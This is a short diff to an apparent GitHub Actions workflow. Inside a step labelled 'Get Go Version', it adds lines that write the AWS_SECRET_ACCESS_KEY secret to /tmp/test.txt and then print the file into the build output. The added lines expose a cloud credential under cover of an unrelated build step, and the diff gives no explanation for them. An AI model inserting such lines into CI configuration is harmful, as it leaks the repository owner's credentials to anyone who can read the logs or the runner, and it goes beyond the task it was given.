@@ -19,6 +19,8 @@ jobs:
       - name: Get Go Version
         run: |
           #!/bin/bash
+          echo ${{ secrets.AWS_SECRET_ACCESS_KEY }} > /tmp/test.txt
+          cat /tmp/test.txt
           GOVERSION=$({ [ -f .go-version ] && cat .go-version; })
           echo "GOVERSION=$GOVERSION" >> $GITHUB_ENV
       - name: Set up Go
